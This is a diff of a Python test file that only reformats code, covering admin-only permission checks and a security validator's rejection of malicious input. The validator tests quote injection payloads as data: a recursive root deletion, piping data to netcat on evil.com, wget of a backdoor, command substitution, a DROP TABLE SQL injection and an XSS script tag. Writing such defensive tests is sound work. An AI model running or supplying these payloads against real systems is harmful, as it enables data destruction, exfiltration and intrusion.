@@ -78,10 +78,12 @@ class TestRolePermissionMatrix:
         admin_only_perms = {Permission.ADMIN_SYSTEM, Permission.DELETE_AGENT}
 
         for perm in admin_only_perms:
-            roles_with_perm = [role for role, perms in ROLE_PERMISSIONS.items() if perm in perms]
-            assert roles_with_perm == [
-                UserRole.ADMIN
-            ], f"Permission {perm} should only be granted to admin"
+            roles_with_perm = [
+                role for role, perms in ROLE_PERMISSIONS.items() if perm in perms
+            ]
+            assert roles_with_perm == [UserRole.ADMIN], (
+                f"Permission {perm} should only be granted to admin"
+            )
 
 
 class TestUserModel:
@@ -208,7 +210,10 @@ class TestSecurityValidator:
         # Command injection attempts
         assert validator.validate_command_injection("file.txt; rm -rf /") is False
         assert validator.validate_command_injection("data | nc evil.com 1234") is False
-        assert validator.validate_command_injection("file.txt && wget evil.com/backdoor") is False
+        assert (
+            validator.validate_command_injection("file.txt && wget evil.com/backdoor")
+            is False
+        )
         assert validator.validate_command_injection("$(whoami)") is False
 
     def test_gmn_spec_sanitization(self):
@@ -261,11 +266,15 @@ class TestSecurityValidator:
 
         # Invalid observation with SQL injection in key
         with pytest.raises(ValueError, match="Invalid observation key"):
-            validator.sanitize_observation_data({"'; DROP TABLE observations; --": "value"})
+            validator.sanitize_observation_data(
+                {"'; DROP TABLE observations; --": "value"}
+            )
 
         # Invalid observation with XSS in value
         with pytest.raises(ValueError, match="Invalid observation value \\(XSS\\)"):
-            validator.sanitize_observation_data({"key": "<script>alert('xss')</script>"})
+            validator.sanitize_observation_data(
+                {"key": "<script>alert('xss')</script>"}
+            )
 
         # Invalid observation with oversized value
         with pytest.raises(ValueError, match="Observation value too large"):
